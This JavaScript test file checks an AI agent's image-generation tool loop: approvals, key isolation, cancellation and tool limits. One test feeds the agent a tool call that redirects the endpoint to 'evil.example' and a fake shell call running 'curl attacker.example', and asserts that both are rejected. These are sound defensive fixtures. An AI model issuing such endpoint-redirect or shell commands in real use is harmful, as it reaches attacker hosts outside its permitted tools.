import test from 'node:test';
import assert from 'node:assert/strict';
import { runConversation } from '../src/agent.js';
import { ARK_ENDPOINT, ARK_FLASH_MODEL, ARK_PRO_MODEL, DEFAULT_TEXT_MODEL, GEMINI_ENDPOINT, IMAGE_MODEL } from '../src/core.js';

const config = { protocol: 'gemini', url: GEMINI_ENDPOINT, trustedTarget: GEMINI_ENDPOINT, key: 'synthetic-chat-key', model: DEFAULT_TEXT_MODEL };
const imageConfig = { ...config, key: 'synthetic-image-key', model: IMAGE_MODEL };
const messages = [{ role: 'user', content: '请画一只猫' }];
const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a7V8AAAAASUVORK5CYII=';
const call = (id = 'call-1', args = { prompt: 'A cat', aspectRatio: '1:1', imageSize: '1K' }) => ({ functionCall: { name: 'image_generate', id, args }, thoughtSignature: 'opaque-signature' });
const gemini = parts => ({ candidates: [{ content: { role: 'model', parts }, finishReason: 'STOP' }], usageMetadata: { totalTokenCount: 10 } });
const imageResponse = () => gemini([{ inlineData: { mimeType: 'image/png', data: png } }]);
const reply = text => gemini([{ text }]);
function sequence(responses, requests = []) {
  return async (url, options) => {
    requests.push({ url, options, body: options.body ? JSON.parse(options.body) : null });
    assert.ok(responses.length, 'Unexpected extra network call');
    const response = responses.shift();
    if (typeof response === 'function') return response(url, options);
    return new Response(JSON.stringify(response), { status: 200 });
  };
}

 test('Gemini tool loop shares image core and preserves thought signature and native result', async () => {
  const requests = [], confirmations = [], events = [], checkpoints = [];
  const result = await runConversation({ config, imageConfig, messages,
    fetchImpl: sequence([gemini([call()]), imageResponse(), reply('图片已生成。')], requests),
    confirmTool: async invocation => { confirmations.push(invocation); return true; },
    onToolResult: event => events.push(event), onHistory: history => checkpoints.push(history),
  });
  assert.equal(result.text, '图片已生成。');
  assert.equal(requests.length, 3);
  assert.equal(confirmations.length, 1);
  assert.equal(confirmations[0].target, GEMINI_ENDPOINT);
  assert.equal(confirmations[0].model, IMAGE_MODEL);
  assert.equal(JSON.stringify(confirmations).includes(imageConfig.key), false);
  assert.ok(requests[1].url.includes(IMAGE_MODEL));
  assert.equal(requests[1].options.headers['x-goog-api-key'], imageConfig.key);
  assert.equal(requests[2].body.contents[1].parts[0].thoughtSignature, 'opaque-signature');
  assert.equal(requests[2].body.contents[2].parts[0].functionResponse.id, 'call-1');
  assert.equal(requests[2].body.contents[2].parts[0].functionResponse.response.imageCount, 1);
  const effect = requests[2].body.contents[2].parts[0].functionResponse.response;
  assert.equal(effect.stage, 'received');
  assert.deepEqual(effect.checks, {rasterSignature:'matched',decoded:'unknown',delivered:'unknown',goalSatisfied:'unknown'});
  assert.equal(JSON.stringify(requests[2].body).includes(png), false);
  assert.equal(events[0].result.images[0].data, png);
  assert.equal(result.history.length, 4);
  assert.equal(checkpoints.at(-1).length, 4);
});

test('host delivery failure cannot retrospectively claim that a received image was displayed', async () => {
  let history;
  await assert.rejects(runConversation({config,imageConfig,messages,
    fetchImpl:sequence([gemini([call()]),imageResponse()]),confirmTool:async()=>true,
    onHistory:value=>{history=value;},onToolResult:()=>{throw new Error('synthetic host delivery failed');}
  }),/synthetic host delivery failed/);
  const result=history.at(-1).raw.parts[0].functionResponse.response;
  assert.equal(result.stage,'received');
  assert.equal(result.checks.delivered,'unknown');
  assert.doesNotMatch(result.message,/已交给界面显示/);
});

test('OpenAI function calls round-trip through the same Gemini image dispatcher', async () => {
  const openai = { protocol: 'openai', url: 'https://api.openai.com/v1', trustedTarget: 'https://api.openai.com/v1', key: 'synthetic-openai-key', model: 'gpt-4.1-mini' };
  const requests = [];
  const first = { choices: [{ message: { role: 'assistant', content: null, tool_calls: [{ id: 'oa-1', type: 'function', function: { name: 'image_generate', arguments: JSON.stringify({ prompt: 'A cat' }) } }] } }] };
  const last = { choices: [{ message: { role: 'assistant', content: 'Done' } }] };
  const result = await runConversation({ config: openai, imageConfig, messages, confirmTool: async () => true,
    fetchImpl: sequence([first, imageResponse(), last], requests) });
  assert.equal(result.text, 'Done');
  assert.equal(requests[2].body.messages[2].role, 'tool');
  assert.equal(requests[2].body.messages[2].tool_call_id, 'oa-1');
  assert.equal(requests[1].options.headers['x-goog-api-key'], imageConfig.key);
  assert.equal(requests[2].options.headers.Authorization, `Bearer ${openai.key}`);
});

test('current deduplication policy confirms and dispatches identical tool requests once', async () => {
  const requests = []; let confirmations = 0;
  const result = await runConversation({ config, imageConfig, messages,
    confirmTool: async () => { confirmations += 1; return true; },
    fetchImpl: sequence([gemini([call('a'), call('b')]), imageResponse(), reply('完成')], requests) });
  assert.equal(confirmations, 1);
  assert.equal(requests.length, 3);
  assert.equal(result.toolResults.length, 1);
  assert.equal(JSON.parse(result.history[3].content).reused, true);
});

test('declining a tool request never sends an image request', async () => {
  const requests = [];
  const result = await runConversation({ config, imageConfig, messages, confirmTool: async () => false,
    fetchImpl: sequence([gemini([call()]), reply('已取消生成')], requests) });
  assert.equal(requests.length, 2);
  assert.equal(result.toolResults.length, 0);
  assert.equal(JSON.parse(result.history[2].content).code, 'USER_DECLINED');
});

test('missing image configuration is recoverable with a completed tool-history checkpoint', async () => {
  let latest;
  await assert.rejects(runConversation({ config, messages, onHistory: history => { latest = history; },
    fetchImpl: sequence([gemini([call()])]) }), error => {
      assert.equal(error.code, 'IMAGE_CONFIG_REQUIRED');
      assert.equal(error.history.at(-1).role, 'tool');
      return true;
    });
  assert.equal(latest.at(-1).role, 'tool');
});

test('completed image survives follow-up text failure without retry', async () => {
  const requests = []; let latest;
  await assert.rejects(runConversation({ config, imageConfig, messages, confirmTool: async () => true,
    onHistory: history => { latest = history; },
    fetchImpl: sequence([gemini([call()]), imageResponse(), () => new Response('synthetic-image-key', { status: 500 })], requests),
  }), error => {
    assert.equal(error.toolResults.length, 1);
    assert.equal(error.history.at(-1).role, 'tool');
    assert.equal(error.message.includes(imageConfig.key), false);
    return true;
  });
  assert.equal(requests.length, 3);
  assert.equal(latest.at(-1).role, 'tool');
});

test('aborted turn makes no requests', async () => {
  const controller = new AbortController(); controller.abort();
  await assert.rejects(runConversation({ config, imageConfig, messages, signal: controller.signal,
    fetchImpl: () => assert.fail('Network must not run') }), { code: 'CANCELLED' });
});

test('cancellation during image request is not retried and resolves outstanding tool history', async () => {
  const controller = new AbortController(); let count = 0;
  await assert.rejects(runConversation({ config, imageConfig, messages, signal: controller.signal, confirmTool: async () => true,
    fetchImpl: sequence([gemini([call()]), () => { count += 1; controller.abort(); throw new Error('abort'); }]),
  }), error => {
    assert.equal(error.code, 'CANCELLED');
    assert.equal(JSON.parse(error.history.at(-1).content).code, 'CANCELLED');
    return true;
  });
  assert.equal(count, 1);
});

test('model cannot change endpoint or invoke shell', async () => {
  let confirmed = false;
  await assert.rejects(runConversation({ config, imageConfig, messages,
    confirmTool: async () => { confirmed = true; return true; },
    fetchImpl: sequence([gemini([call('bad', { prompt: 'cat', endpoint: 'https://evil.example' })])]),
  }), { code: 'INVALID_TOOL_ARGUMENTS' });
  assert.equal(confirmed, false);
  const shellCall = { functionCall: { name: 'shell', id: 'bad', args: { command: 'curl attacker.example' } } };
  const result = await runConversation({ config, imageConfig, messages,
    fetchImpl: sequence([gemini([shellCall]), reply('无法执行。')]) });
  assert.equal(JSON.parse(result.history[2].content).code, 'UNKNOWN_TOOL');
});

test('trusted endpoint is required before even showing per-call approval', async () => {
  await assert.rejects(runConversation({ config, imageConfig: { ...imageConfig, trustedTarget: '' }, messages,
    confirmTool: () => assert.fail('Cannot approve untrusted configuration'),
    fetchImpl: sequence([gemini([call()])]),
  }), { code: 'UNTRUSTED_ENDPOINT' });
});

test('tool loops are bounded and do not repeat generation', async () => {
  let confirmations = 0;
  await assert.rejects(runConversation({ config, imageConfig, messages,
    confirmTool: async () => { confirmations += 1; return true; },
    fetchImpl: sequence([gemini([call('one')]), imageResponse(), gemini([call('two')]), gemini([call('three')])]),
  }), { code: 'TOOL_LIMIT' });
  assert.equal(confirmations, 1);
});

test('history checkpoints never expose an unresolved native tool group', async () => {
  const checkpoints = [];
  const requests = [];
  await runConversation({ config, imageConfig, messages,
    confirmTool: async () => true, onHistory: history => checkpoints.push(history),
    fetchImpl: sequence([gemini([call('first'), call('second')]), imageResponse(), reply('完成')], requests),
  });
  assert.equal(checkpoints.length, 2);
  assert.equal(checkpoints[0].length, 4);
  assert.equal(checkpoints[0][2].role, 'tool');
  assert.equal(checkpoints[0][3].role, 'tool');
});

test('cancellation while awaiting approval prevents generation', async () => {
  const controller = new AbortController(); const requests = [];
  await assert.rejects(runConversation({ config, imageConfig, messages, signal: controller.signal,
    confirmTool: async () => { controller.abort(); return true; },
    fetchImpl: sequence([gemini([call()])], requests),
  }), { code: 'CANCELLED' });
  assert.equal(requests.length, 1);
});

test('plain chat omits tool declarations until image workspace is configured and trusted', async () => {
  for (const unready of [undefined, { ...imageConfig, key: '' }, { ...imageConfig, trustedTarget: '' }]) {
    const requests = [];
    const result = await runConversation({ config, imageConfig: unready, messages,
      fetchImpl: sequence([reply('你好')], requests) });
    assert.equal(result.text, '你好');
    assert.equal(requests[0].body.tools, undefined);
  }
});

test('more than four tool calls in one turn is rejected without image generation', async () => {
  const requests = [];
  await assert.rejects(runConversation({ config, imageConfig, messages,
    confirmTool: () => assert.fail('Excessive batch must not request approval'),
    fetchImpl: sequence([gemini(Array.from({ length: 5 }, (_, index) => call(String(index), { prompt: `Image ${index}` })))], requests),
  }), error => {
    assert.equal(error.code, 'TOOL_LIMIT');
    assert.equal(error.history.filter(message => message.role === 'tool').length, 5);
    return true;
  });
  assert.equal(requests.length, 1);
});

const arkTextConfig = { protocol: 'ark', url: ARK_ENDPOINT, trustedTarget: ARK_ENDPOINT, key: 'synthetic-ark-chat-key', model: 'synthetic-ark-text-model' };
const arkImageConfig = { ...arkTextConfig, key: 'synthetic-ark-image-key', model: ARK_FLASH_MODEL };
const openaiToolReply = (args = { prompt: 'A cat' }) => ({ choices: [{ message: { role: 'assistant', content: null, tool_calls: [{ id: 'ark-call', type: 'function', function: { name: 'image_generate', arguments: JSON.stringify(args) } }] } }] });
const openaiTextReply = text => ({ choices: [{ message: { role: 'assistant', content: text } }] });
const arkImageResponse = () => ({ data: [{ b64_json: png }], usage: { generated_images: 1 } });

test('Ark text agent advertises Ark image sizes and uses shared dispatcher with independent keys', async () => {
  const requests = [], approvals = [];
  const result = await runConversation({ config: arkTextConfig, imageConfig: arkImageConfig, messages,
    confirmTool: async invocation => { approvals.push(invocation); return true; },
    fetchImpl: sequence([openaiToolReply(), arkImageResponse(), openaiTextReply('已交给界面显示')], requests),
  });
  assert.equal(result.text, '已交给界面显示');
  assert.equal(requests[0].url, `${ARK_ENDPOINT}/chat/completions`);
  const schema = requests[0].body.tools[0].function.parameters;
  assert.deepEqual(schema.properties.imageSize.enum, ['1K', '1.5K', '2K']);
  assert.equal(schema.properties.aspectRatio.enum.length, 8);
  assert.equal(requests[1].url, `${ARK_ENDPOINT}/images/generations`);
  assert.equal(requests[1].body.model, ARK_FLASH_MODEL);
  assert.equal(requests[1].body.size, '2048x2048');
  assert.equal(requests[1].body.response_format, 'b64_json');
  assert.equal(requests[1].options.headers.Authorization, `Bearer ${arkImageConfig.key}`);
  assert.equal(requests[2].options.headers.Authorization, `Bearer ${arkTextConfig.key}`);
  assert.equal(requests[2].body.messages[2].role, 'tool');
  assert.equal(requests[2].body.messages[2].tool_call_id, 'ark-call');
  assert.equal(approvals.length, 1);
  assert.equal(approvals[0].args.imageSize, '2K');
  assert.equal(approvals[0].target, ARK_ENDPOINT);
  assert.equal(approvals[0].model, ARK_FLASH_MODEL);
  assert.equal(JSON.stringify(approvals).includes(arkImageConfig.key), false);
  assert.equal(JSON.stringify(result.history).includes(arkImageConfig.key), false);
});

test('Gemini text can invoke Ark Pro image without protocol leakage', async () => {
  const requests = [];
  const result = await runConversation({ config, imageConfig: { ...arkImageConfig, model: ARK_PRO_MODEL }, messages,
    confirmTool: async invocation => { assert.equal(invocation.args.imageSize, '2K'); return true; },
    fetchImpl: sequence([gemini([call('gem-ark', { prompt: 'A cat' })]), arkImageResponse(), reply('完成')], requests),
  });
  assert.equal(result.toolResults[0].result.model, ARK_PRO_MODEL);
  assert.equal(requests[1].body.model, ARK_PRO_MODEL);
  assert.equal(requests[2].body.contents[2].parts[0].functionResponse.id, 'gem-ark');
  assert.equal(requests[2].options.headers['x-goog-api-key'], config.key);
});

test('unsupported Ark image size fails before confirmation and before image network', async () => {
  const requests = [];
  await assert.rejects(runConversation({ config: arkTextConfig, imageConfig: arkImageConfig, messages,
    confirmTool: () => assert.fail('Unsupported size must not request approval'),
    fetchImpl: sequence([openaiToolReply({ prompt: 'A cat', imageSize: '4K' })], requests),
  }), error => {
    assert.ok(error.code);
    assert.equal(error.history.at(-1).role, 'tool');
    return true;
  });
  assert.equal(requests.length, 1);
});

test('Ark ordinary text remains tool-free without image configuration', async () => {
  const requests = [];
  const result = await runConversation({ config: arkTextConfig, messages,
    fetchImpl: sequence([openaiTextReply('普通文本')], requests),
  });
  assert.equal(result.text, '普通文本');
  assert.equal(requests[0].body.tools, undefined);
});
